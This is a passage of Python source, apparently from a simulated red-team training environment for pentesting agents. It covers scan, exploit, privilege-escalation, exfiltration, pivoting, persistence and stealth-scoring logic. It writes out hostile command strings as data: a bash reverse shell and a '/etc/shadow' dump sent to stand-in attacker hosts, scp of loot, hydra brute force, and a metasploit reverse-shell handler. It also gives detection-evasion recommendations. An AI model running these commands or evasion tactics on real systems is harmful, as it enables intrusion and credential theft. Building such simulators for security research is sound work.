                table.add_row(key, f"[bold yellow]{', '.join(value)}[/bold yellow]")
            elif key in ["credentials_reset"] and value:
                table.add_row(key, "[bold red]True[/bold red]")
            elif key in ["alert_increase", "risk_increase"]:
                color = "yellow" if value > 5 else "green"
                table.add_row(key, f"[{color}]{value:.2f}[/{color}]")
            else:
                table.add_row(key, str(value))
                
        console.print(Panel(table, border_style="blue"))
    
    def _visualize_environment_state(self):
        """Visualize the current state of the environment"""
        from rich.panel import Panel
        from rich.table import Table
        from rich.columns import Columns
        
        state_table = Table(title="🌐 System State")
        state_table.add_column("Property", style="cyan")
        state_table.add_column("Value", style="green")
        
        state_table.add_row("Phase", self.current_phase)
        state_table.add_row("Privilege", self.privilege_level)
        state_table.add_row("Target IP", self.target_ip)
        state_table.add_row("Hostname", self.hostname)
        state_table.add_row("Difficulty", str(self.difficulty_level))
        
        security_table = Table(title="🔒 Security State")
        security_table.add_column("Property", style="magenta")
        security_table.add_column("Value", style="yellow")
        
        alert_color = "green" if self.blue_team_alert < 30 else "yellow" if self.blue_team_alert < 60 else "red"
        risk_color = "green" if self.detection_risk < 3 else "yellow" if self.detection_risk < 6 else "red"
        
        security_table.add_row("Blue Alert", f"[{alert_color}]{self.blue_team_alert:.2f}[/{alert_color}]")
        security_table.add_row("Detection Risk", f"[{risk_color}]{self.detection_risk:.2f}[/{risk_color}]")
        security_table.add_row("Credentials Found", str(self.credentials_found))
        security_table.add_row("Data Exfiltrated", str(self.data_exfiltrated))
        security_table.add_row("Honeypots", ", ".join(self.honeypots) if self.honeypots else "None")
        
        services_table = Table(title="🖥️ Network Services")
        services_table.add_column("Type", style="blue")
        services_table.add_column("Details", style="green")
        
        port_text = ", ".join(str(p) for p in self.open_ports[:8])
        if len(self.open_ports) > 8:
            port_text += f" + {len(self.open_ports) - 8} more"
            
        services_table.add_row("Open Ports", port_text)
        services_table.add_row("Services", ", ".join(self.services))
        
        console.print(
            Panel(
                Columns([state_table, security_table, services_table]),
                title="🌍 Environment State",
                border_style="bright_blue"
            )
        )

    def adjust_difficulty_by_performance(self, agent_performance):
        """Adjust difficulty based on agent performance metrics."""
        if agent_performance.get('reward_avg', 0) > 20:
            self.detection_risk += 0.1
            self.deploy_honeypot()

    def deploy_honeypot(self):
        if hasattr(self, "honeypots"):
            self.honeypots.append(f"honeypot_{random.randint(100,999)}")
            console.print("[yellow]🛡️ Honeypot deployed due to RedAgent aggression.[/yellow]")

    # --- Curriculum scaffolding: progressive difficulty ---
    # To implement: parameterize scenario difficulty in config/setup_multiagent.py and increase self.difficulty_level over episodes.

    # ─────────────────────────────────────────────
    # 🤖 Autonomous Agent-Environment Interaction
    # ─────────────────────────────────────────────
    def autonomous_interaction(self, agent_id, intent, query=None):
        """
        Enables autonomous interaction between agents and environment
        for advanced pentesting operations, especially in live mode.
        
        Args:
            agent_id (str): ID of agent initiating the interaction
            intent (str): Purpose of interaction (scan, enum, exploit, etc.)
            query (dict, optional): Specific parameters for the interaction
            
        Returns:
            dict: Results of interaction including discoveries, state changes, etc.
        """
        console.print(f"[cyan]🔄 Autonomous interaction from {agent_id}: {intent}[/cyan]")
        
        results = {
            "success": False,
            "discoveries": [],
            "state_change": False,
            "message": "",
            "error": None
        }
        
        if query is None:
            query = {}
            
        try:
            if intent == "scan_target":
                target_ip = query.get("ip", self.target_ip)
                scan_type = query.get("scan_type", "basic")
                
                if scan_type == "stealth":
                    command = f"nmap -sS -T2 {target_ip}"
                elif scan_type == "version":
                    command = f"nmap -sV {target_ip}"
                elif scan_type == "comprehensive":
                    command = f"nmap -A {target_ip}"
                else:
                    command = f"nmap {target_ip}"
                
                reward, info = self._process_scan_command(command)
                
                results["success"] = info.get("success", False)
                results["discoveries"] = info.get("new_discoveries", [])
                results["message"] = info.get("message", "Scan completed")
                results["reward"] = reward
                
            elif intent == "enumerate_service":
                service = query.get("service", "")
                target_ip = query.get("ip", self.target_ip)
                
                if not service:
                    results["error"] = "No service specified for enumeration"
                    return results
                
                if service == "web":
                    command = f"gobuster dir -u http://{target_ip} -w /usr/share/wordlists/dirb/common.txt"
                elif service == "smb":
                    command = f"enum4linux {target_ip}"
                elif service == "sql":
                    command = f"sqlmap -u http://{target_ip} --forms --batch"
                else:
                    command = f"nmap -sV -p- {target_ip}"
                
                reward, info = self._process_enum_command(command)
                
                results["success"] = info.get("success", False)
                results["discoveries"] = info.get("new_discoveries", [])
                results["message"] = info.get("message", "Enumeration completed")
                results["reward"] = reward
                
            elif intent == "exploit_vulnerability":
                vuln_id = query.get("vuln_id", "")
                technique = query.get("technique", "manual")
                
                if not vuln_id and not self.discovered_vulnerabilities:
                    results["error"] = "No vulnerability specified for exploitation"
                    return results
                
                if not vuln_id and self.discovered_vulnerabilities:
                    vuln_id = self.discovered_vulnerabilities[0]
                
                if technique == "metasploit":
                    command = f"msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; run'"
                elif technique == "bruteforce":
                    command = f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{self.target_ip}"
                else:
                    command = f"exploit vulnerability {vuln_id}"
                
                reward, info = self._process_exploit_command(command)
                
                results["success"] = info.get("success", False)
                results["state_change"] = info.get("success", False)
                results["message"] = info.get("message", "Exploitation attempt completed")
                results["reward"] = reward
                
            elif intent == "privesc_attempt":
                technique = query.get("technique", "search")
                
                if self.privilege_level == "none":
                    results["error"] = "Cannot attempt privilege escalation without access to target"
                    return results
                
                if technique == "search":
                    command = "linpeas.sh"
                elif technique == "sudo":
                    command = "sudo -l"
                elif technique == "kernel":
                    command = "uname -a && searchsploit kernel"
                else:
                    command = "bash -i >& /dev/tcp/attacker/4444 0>&1"
                
                reward, info = self._process_privesc_command(command)
                
                results["success"] = info.get("success", False)
                results["state_change"] = info.get("success", False)
                results["message"] = info.get("message", "Privilege escalation attempt completed")
                results["reward"] = reward
                
            elif intent == "exfiltrate_data":
                method = query.get("method", "archive")
                target = query.get("target", "sensitive")
                
                if self.privilege_level == "none":
                    results["error"] = "Cannot exfiltrate data without access to target"
                    return results
                
                if method == "archive":
                    command = f"tar -czvf data.tar.gz /home/{target}"
                elif method == "transfer":
                    command = f"scp data.tar.gz attacker@192.168.1.100:/home/attacker/loot/"
                else:
                    command = f"cat /etc/shadow > /dev/tcp/attacker/8080"
                
                reward, info = self._process_exfil_command(command)
                
                results["success"] = info.get("success", False)
                results["state_change"] = info.get("success", False) and info.get("success", False)
                results["message"] = info.get("message", "Data exfiltration attempt completed")
                results["reward"] = reward
                
            elif intent == "pivot_to_new_target":
                pivot_results = self.pivot_to_target(query.get("new_target_ip", ""))
                results.update(pivot_results)
                
            elif intent == "deploy_persistence":
                persistence_results = self.establish_persistence(
                    query.get("method", "cron"),
                    query.get("payload", "reverse_shell")
                )
                results.update(persistence_results)
                
            else:
                results["error"] = f"Unknown interaction intent: {intent}"
                
            self._record_autonomous_interaction(agent_id, intent, query, results)
            
            return results
            
        except Exception as e:
            console.print(f"[red]❌ Error during autonomous interaction: {e}[/red]")
            console.print(traceback.format_exc())
            results["error"] = str(e)
            return results
            
    def _record_autonomous_interaction(self, agent_id, intent, query, results):
        """Record autonomous interactions for analysis and visualization"""
        if not hasattr(self, "stats_monitor") or self.stats_monitor is None:
            return
            
        interaction = {
            "timestamp": time.time(),
            "agent_id": agent_id,
            "intent": intent,
            "query": query,
            "results": {
                "success": results.get("success", False),
                "message": results.get("message", ""),
                "reward": results.get("reward", 0.0)
            },
            "environment_state": {
                "phase": self.current_phase,
                "detection_risk": round(self.detection_risk, 2),
                "blue_team_alert": round(self.blue_team_alert, 2)
            }
        }
        
        self.stats_monitor.record_autonomous_interaction(interaction)

    # ─────────────────────────────────────────────
    # 🔄 Pivoting & Persistence Mechanisms
    # ─────────────────────────────────────────────
    def pivot_to_target(self, new_target_ip=None):
        """
        Pivot from current compromised host to another target on the network.
        Creates a new target in the environment that can be attacked.
        
        Args:
            new_target_ip (str, optional): IP of target to pivot to. If None, generates random IP.
            
        Returns:
            dict: Results of pivot attempt including success/failure
        """
        results = {
            "success": False,
            "message": "",
            "new_target": None,
            "network_path": []
        }
        
        try:
            if self.privilege_level == "none":
                results["message"] = "Cannot pivot without access to current target"
                return results
                
            is_root = self.privilege_level == "root"
            success_chance = 0.8 if is_root else 0.4
            
            if new_target_ip is None:
                current_ip_parts = self.target_ip.split('.')
                new_ip_parts = current_ip_parts[:3] + [str(random.randint(2, 254))]
                new_target_ip = '.'.join(new_ip_parts)
            
            if new_target_ip == self.target_ip:
                results["message"] = "Cannot pivot to the same host"
                return results
                
            if random.random() < success_chance:
                networked_target = {
                    "ip": new_target_ip,
                    "hostname": f"host-{random.randint(100,999)}",
                    "open_ports": sorted(random.sample(range(20, 10000), k=random.randint(3, 8))),
                    "services": random.sample(self.default_services, 3),
                    "service_banners": {},
                    "vulnerabilities": [],
                    "privilege_level": "none",
                    "pivot_path": [self.target_ip, new_target_ip]
                }
                
                if not hasattr(self, "network_targets"):
                    self.network_targets = []
                self.network_targets.append(networked_target)
                
                results["success"] = True
                results["message"] = f"Successfully pivoted to {new_target_ip}"
                results["new_target"] = networked_target
                results["network_path"] = networked_target["pivot_path"]
                
                console.print(f"[green]✓ Successful pivot to new target: {new_target_ip}[/green]")
                
                self.stealth_metric = min(10.0, self.stealth_metric + 0.5)
                
            else:
                results["message"] = "Pivot attempt failed - unable to reach target"
                
                self._increase_detection(0.3)
                
            return results
                
        except Exception as e:
            console.print(f"[red]❌ Error during pivot: {e}[/red]")
            console.print(traceback.format_exc())
            results["message"] = f"Error during pivot: {str(e)}"
            return results

    def switch_target(self, target_ip):
        """
        Switch current active target to another host that was previously discovered via pivoting.
        
        Args:
            target_ip (str): IP address of the target to switch to
            
        Returns:
            bool: True if switch successful, False otherwise
        """
        if not hasattr(self, "network_targets") or not self.network_targets:
            console.print("[yellow]⚠ No network targets available to switch to[/yellow]")
            return False
            
        target = None
        for t in self.network_targets:
            if t["ip"] == target_ip:
                target = t
                break
                
        if not target:
            console.print(f"[yellow]⚠ Target {target_ip} not found in network[/yellow]")
            return False
            
        current_target = {
            "ip": self.target_ip,
            "hostname": self.hostname,
            "open_ports": self.open_ports.copy(),
            "services": self.services.copy(),
            "service_banners": self.service_banners.copy(),
            "vulnerabilities": self.discovered_vulnerabilities.copy(),
            "privilege_level": self.privilege_level
        }
        
        self.target_ip = target["ip"]
        self.hostname = target["hostname"]
        self.open_ports = target["open_ports"]
        self.services = target["services"]
        self.service_banners = target["service_banners"]
        self.discovered_vulnerabilities = target["vulnerabilities"]
        self.privilege_level = target["privilege_level"]
        
        self.credentials_found = False
        
        self._visualize_state_change("Target Switch", {
            "previous_target": current_target["ip"],
            "new_target": self.target_ip,
            "network_path": target.get("pivot_path", []),
            "privilege_level": self.privilege_level
        })
        
        self.state = self.get_global_state()
        
        return True

    def establish_persistence(self, method="cron", payload="reverse_shell"):
        """
        Establish persistence on the compromised system to maintain access
        even if the system is rebooted or credentials are changed.
        
        Args:
            method (str): Persistence method (cron, service, startup, registry, etc.)
            payload (str): Type of payload to use for persistence
            
        Returns:
            dict: Results of persistence attempt
        """
        results = {
            "success": False,
            "method": method,
            "payload": payload,
            "message": "",
            "detection_chance": 0.0
        }
        
        if self.privilege_level == "none":
            results["message"] = "Cannot establish persistence without system access"
            return results
            
        is_root = self.privilege_level == "root"
        success_chance = 0.9 if is_root else 0.5
        
        detection_chances = {
            "cron": 0.3,
            "service": 0.4,
            "startup": 0.5,
            "registry": 0.4,
            "kernel_module": 0.7,
            "web_shell": 0.5,
            "ssh_key": 0.2
        }
        
        detection_chance = detection_chances.get(method, 0.5)
        
        root_required = method in ["kernel_module", "service"]
        if root_required and not is_root:
            results["message"] = f"Root privileges required for {method} persistence"
            return results
        
        if random.random() < success_chance:
            if not hasattr(self, "persistence_mechanisms"):
                self.persistence_mechanisms = []
                
            persistence = {
                "id": f"persist_{len(self.persistence_mechanisms) + 1}",
                "method": method,
                "payload": payload,
                "target": self.target_ip,
                "detection_chance": detection_chance,
                "timestamp": time.time()
            }
            
            self.persistence_mechanisms.append(persistence)
            
            results["success"] = True
            results["message"] = f"Successfully established {method} persistence on {self.target_ip}"
            results["detection_chance"] = detection_chance
            
            console.print(f"[green]✓ Persistence established on {self.target_ip} using {method}[/green]")
            
            self._increase_detection(detection_chance)
            
        else:
            results["message"] = "Failed to establish persistence"
            
            self._increase_detection(detection_chance * 0.5)
            
        return results
        
    def check_persistence(self):
        """
        Check if any persistence mechanisms have been detected by blue team
        or are still functional.
        
        Returns:
            list: Status of all persistence mechanisms
        """
        if not hasattr(self, "persistence_mechanisms") or not self.persistence_mechanisms:
            return []
            
        results = []
        active_persistence = []
        
        for persist in self.persistence_mechanisms:
            time_factor = min(1.0, (time.time() - persist["timestamp"]) / 86400)
            detection_chance = persist["detection_chance"] * (time_factor + 0.1)
            detected = random.random() < detection_chance
            
            status = {
                "id": persist["id"],
                "method": persist["method"],
                "target": persist["target"],
                "detected": detected,
                "active": not detected
            }
            
            results.append(status)
            
            if not detected:
                active_persistence.append(persist)
        
        self.persistence_mechanisms = active_persistence
        
        return results
        
    def use_persistence(self, persistence_id=None):
        """
        Use an established persistence mechanism to regain access to a system
        after being locked out or after credential changes.
        
        Args:
            persistence_id (str, optional): ID of specific persistence to use.
                                          If None, tries any available persistence.
                                          
        Returns:
            bool: True if successfully regained access, False otherwise
        """
        if not hasattr(self, "persistence_mechanisms") or not self.persistence_mechanisms:
            console.print("[yellow]⚠ No persistence mechanisms available[/yellow]")
            return False
            
        if persistence_id:
            persist = None
            for p in self.persistence_mechanisms:
                if p["id"] == persistence_id:
                    persist = p
                    break
                    
            if not persist:
                console.print(f"[yellow]⚠ Persistence mechanism {persistence_id} not found[/yellow]")
                return False
        else:
            available = [p for p in self.persistence_mechanisms if p["target"] == self.target_ip]
            if not available:
                console.print(f"[yellow]⚠ No persistence mechanisms for current target {self.target_ip}[/yellow]")
                return False
                
            persist = available[0]
            
        success_chance = 0.9
        if random.random() < success_chance:
            if self.privilege_level == "none":
                self.privilege_level = "user"
                
            if persist["method"] in ["kernel_module", "service", "cron"] and random.random() < 0.7:
                self.privilege_level = "root"
                
            self.credentials_found = True
            
            console.print(f"[green]✓ Successfully used {persist['method']} persistence to regain access to {self.target_ip}[/green]")
            console.print(f"[green]✓ Current privilege level: {self.privilege_level}[/green]")
            
            self._increase_detection(persist["detection_chance"] * 1.5)
            
            return True
        else:
            console.print(f"[red]❌ Failed to use persistence mechanism - it may have been detected and removed[/red]")
            
            self.persistence_mechanisms.remove(persist)
            
            self._increase_detection(0.5)
            
            return False
          
    def check_target_network(self):
        """
        Check what targets are available in the network and their status.
        
        Returns:
            dict: Network map with all targets and their relationship
        """
        network = {
            "main_target": {
                "ip": self.target_ip,
                "hostname": self.hostname,
                "privilege_level": self.privilege_level,
                "compromised": self.privilege_level != "none"
            },
            "pivot_targets": []
        }
        
        if hasattr(self, "network_targets") and self.network_targets:
            for target in self.network_targets:
                network["pivot_targets"].append({
                    "ip": target["ip"],
                    "hostname": target["hostname"],
                    "privilege_level": target["privilege_level"],
                    "compromised": target["privilege_level"] != "none",
                    "pivot_path": target.get("pivot_path", [self.target_ip, target["ip"]])
                })
                
        return network

    # ─────────────────────────────────────────────
    # 🥷 Enhanced Stealth Scoring System
    # ─────────────────────────────────────────────
    def calculate_stealth_score(self, agent_id, action_history=None):
        """
        Calculate a comprehensive stealth score for an agent based on their actions,
        techniques, and adaptation to the environment.
        
        Args:
            agent_id (str): ID of the agent to calculate score for
            action_history (list, optional): Custom action history to use for calculation
            
        Returns:
            dict: Detailed stealth metrics and overall score
        """
        # Use provided history or default to environment's previous actions
        history = action_history if action_history is not None else self.previous_actions
        
        if not history:
            return {
                "score": self.stealth_metric,
                "rating": "N/A - No actions recorded",
                "details": {},
                "recommendations": []
            }
            
        # Initialize stealth metrics
        metrics = {
            "scan_stealth": 0.0,  # How stealthy were scanning techniques
            "enum_stealth": 0.0,  # How stealthy were enumeration methods
            "exploit_precision": 0.0,  # How targeted vs spray-and-pray exploits were
            "repetition_penalty": 0.0,  # Penalty for repeating same actions
            "noise_level": 0.0,  # Overall noise generation
            "timing_factor": 0.0,  # Timing between actions (rapid = noisy)
            "adaptation": 0.0,  # Adaptation to defenses
            "detection_avoidance": 0.0  # Active avoidance of detection
        }
        
        # Analyze scan stealth
        scan_commands = [cmd for cmd in history if self._detect_command_type(cmd) == "scan"]
        if scan_commands:
            stealth_scan_count = sum(1 for cmd in scan_commands if "-sS" in cmd or "stealth" in cmd.lower())
            noisy_scan_count = sum(1 for cmd in scan_commands if "-A" in cmd or "-T4" in cmd or "-T5" in cmd)
            
            if stealth_scan_count > 0:
                metrics["scan_stealth"] = min(10.0, stealth_scan_count * 2.0)
                
            if noisy_scan_count > 0:
                metrics["scan_stealth"] = max(0.0, metrics["scan_stealth"] - (noisy_scan_count * 3.0))
                
            # Analyze scanning patterns
            if len(scan_commands) > 3:
                scan_types = {}
                for cmd in scan_commands:
                    cmd_type = "basic"
                    if "-sS" in cmd:
                        cmd_type = "stealth"
                    elif "-sV" in cmd:
                        cmd_type = "version"
                    elif "-A" in cmd:
                        cmd_type = "aggressive"
                    
                    scan_types[cmd_type] = scan_types.get(cmd_type, 0) + 1
                    
                # If agent uses varied scan types, improve score
                if len(scan_types) >= 3:
                    metrics["adaptation"] += 2.0
                
                # Excessive scanning hurts stealth
                if len(scan_commands) > len(self.open_ports) * 1.5:
                    metrics["repetition_penalty"] -= min(5.0, (len(scan_commands) - len(self.open_ports)) * 0.5)
        
        # Analyze enumeration stealth
        enum_commands = [cmd for cmd in history if self._detect_command_type(cmd) == "enum"]
        if enum_commands:
            targeted_enum_count = 0
            for cmd in enum_commands:
                # Check if enumeration is targeted at a specific service
                for service in self.services:
                    if service in cmd.lower():
                        targeted_enum_count += 1
                        break
                        
            metrics["enum_stealth"] = min(10.0, targeted_enum_count * 1.5)
            
            # Penalize for too many enumeration attempts
            if len(enum_commands) > len(self.services) * 2:
                metrics["repetition_penalty"] -= min(5.0, (len(enum_commands) - len(self.services)) * 0.3)
        
        # Analyze exploit precision
        exploit_commands = [cmd for cmd in history if self._detect_command_type(cmd) == "exploit"]
        if exploit_commands:
            precise_exploit_count = 0
            for cmd in exploit_commands:
                # Check if exploit targets a specific vulnerability or service
                is_precise = False
                for vuln in self.discovered_vulnerabilities:
                    if vuln in cmd.lower():
                        precise_exploit_count += 1
                        is_precise = True
                        break
                        
                if not is_precise:
                    for service in self.services:
                        if service in cmd.lower():
                            precise_exploit_count += 0.5
                            break
            
            metrics["exploit_precision"] = min(10.0, precise_exploit_count * 2.0)
            
            # Penalize for brute force and noisy exploits
            noisy_exploit_count = sum(1 for cmd in exploit_commands if "brute" in cmd.lower() or "hydra" in cmd.lower())
            if noisy_exploit_count > 0:
                metrics["noise_level"] += noisy_exploit_count * 2.0
        
        # Timing analysis - look for pauses between actions
        if len(history) >= 5:
            # This is simplified - in real implementation we'd use timestamps
            rapid_action_sequences = 0
            for i in range(len(history) - 4):
                # Check if 5 consecutive actions are of the same type
                action_types = [self._detect_command_type(history[i+j]) for j in range(5)]
                if len(set(action_types)) <= 2:  # At most 2 different action types
                    rapid_action_sequences += 1
                    
            if rapid_action_sequences > 0:
                metrics["timing_factor"] = -min(5.0, rapid_action_sequences * 1.0)
                
        # Check for detection avoidance techniques
        detection_avoidance_count = 0
        for cmd in history:
            cmd_lower = cmd.lower()
            if any(term in cmd_lower for term in ["proxy", "vpn", "tor", "delay", "slowloris", "stealth"]):
                detection_avoidance_count += 1
                
        metrics["detection_avoidance"] = min(10.0, detection_avoidance_count * 1.5)
        
        # Calculate final score
        weights = {
            "scan_stealth": 0.2,
            "enum_stealth": 0.15,
            "exploit_precision": 0.25,
            "repetition_penalty": 0.1,
            "noise_level": -0.1,  # Negative weight - higher noise reduces stealth
            "timing_factor": 0.1,
            "adaptation": 0.1,
            "detection_avoidance": 0.1
        }
        
        # Apply weighted sum
        stealth_score = 5.0  # Start with a baseline score
        for metric, value in metrics.items():
            weight = weights.get(metric, 0.0)
            stealth_score += value * weight
            
        # Clamp score to range [0, 10]
        stealth_score = max(0.0, min(10.0, stealth_score))
        
        # Generate rating
        if stealth_score >= 9.0:
            rating = "Ghost - Virtually Undetectable"
        elif stealth_score >= 7.5:
            rating = "Shadow - Minimal Detection Risk"
        elif stealth_score >= 6.0:
            rating = "Whisper - Low Profile"
        elif stealth_score >= 4.0:
            rating = "Echo - Detectable"
        elif stealth_score >= 2.0:
            rating = "Thunder - Highly Visible" 
        else:
            rating = "Flashbang - Extremely Noisy"
            
        # Generate recommendations
        recommendations = []
        if metrics["scan_stealth"] < 5.0:
            recommendations.append("Use more stealth scanning techniques (-sS, -T2)")
        if metrics["enum_stealth"] < 5.0:
            recommendations.append("Target enumeration to specific services")
        if metrics["exploit_precision"] < 5.0:
            recommendations.append("Be more precise with exploits - target specific vulnerabilities")
        if metrics["repetition_penalty"] < 0.0:
            recommendations.append("Avoid repetitive actions on the same targets")
        if metrics["noise_level"] > 5.0:
            recommendations.append("Reduce use of noisy techniques like brute forcing")
        if metrics["timing_factor"] < 0.0:
            recommendations.append("Introduce delays between actions to avoid detection")
            
        # Update environment stealth metric
        self.stealth_metric = stealth_score
        
        return {
            "score": stealth_score,
            "rating": rating,
            "details": metrics,
            "recommendations": recommendations
        }
        
    def get_stealth_report(self, agent_id):
        """
        Generate a comprehensive stealth report for the given agent.
        
        Args:
            agent_id (str): ID of agent to generate report for
            
        Returns:
            dict: Detailed stealth report with metrics, history and recommendations
        """
        # Calculate the base stealth score
        stealth_data = self.calculate_stealth_score(agent_id)
        
        # Get blue team alertness level
        blue_alert = self.blue_team_alert
        
        # Get detection risk
        detection = self.detection_risk
        
        # Build the report
        report = {
            "agent_id": agent_id,
            "timestamp": time.time(),
            "stealth_score": stealth_data["score"],
            "stealth_rating": stealth_data["rating"],
            "blue_team_alertness": blue_alert,
            "detection_risk": detection,
            "metrics": stealth_data["details"],
            "action_count": len(self.previous_actions),
            "recommendations": stealth_data["recommendations"],
            "compromised": blue_alert >= self.traceback_threshold
        }
        
        # Add detection prediction
        time_to_detection = None
        if blue_alert < self.traceback_threshold and blue_alert > 0:
            # Estimate time until detection based on current trajectory
            if hasattr(self, "stats_monitor") and self.stats_monitor:
                alert_rate = self.stats_monitor.get_alert_rate()
                if alert_rate > 0:
                    time_to_detection = (self.traceback_threshold - blue_alert) / alert_rate
        
        return report
    
    
    def _print_basic_environment_state(self):
        """Print basic environment state information."""
        try:
            console.print(f"[cyan]Environment State:[/cyan] Phase={self.current_phase}, Ports={len(self.open_ports)}, Alert={self.blue_team_alert:.2f}")
        except Exception:
            pass
